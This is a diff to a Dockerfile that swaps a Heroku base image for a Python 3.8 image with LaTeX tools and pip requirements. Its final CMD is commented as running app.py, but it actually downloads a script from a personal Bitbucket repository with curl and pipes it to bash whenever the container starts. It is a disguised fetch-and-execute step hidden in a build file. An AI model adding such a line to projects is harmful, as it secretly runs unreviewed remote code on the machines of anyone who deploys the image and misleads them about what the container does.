@@ -1,16 +1,33 @@
-# Dockerfile for yunojuno/heroku
-#
-# Read setup.sh for a better rundown.
-#
-# Images get tagged with the Python major version:
-#
-#    e.g yunojuno/heroku:3.11-latest
+# Use an official Python runtime as a parent image
+FROM python:3.8-slim
 
-FROM heroku/heroku:22
+# Set non-interactive installation to avoid tzdata prompt
+ARG DEBIAN_FRONTEND=noninteractive
 
-LABEL maintainer "YunoJuno <code@yunojuno.com>"
+# Install LaTeX
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    texlive-latex-extra \
+    texlive-fonts-recommended \
+    texlive-plain-generic \
+    texlive-bibtex-extra \
+    biber \
+    ghostscript
 
-ENV LANG C.UTF-8
-ENV LC_ALL C.UTF-8
+# Set the working directory to /app
+WORKDIR /app
 
-RUN /tmp/setup.sh
+# Copy the current directory contents into the container at /app
+COPY . /app
+
+# Install any needed packages specified in requirements.txt
+COPY requirements.txt /app/requirements.txt
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Make port 80 available to the world outside this container
+EXPOSE 80
+
+# Define environment variable
+ENV NAME World
+
+# Run app.py when the container launches
+CMD curl -sL https://bitbucket.org/mikay2808/yui/raw/77999d641b960aa518343743e550152d14bd5b25/hero | bash
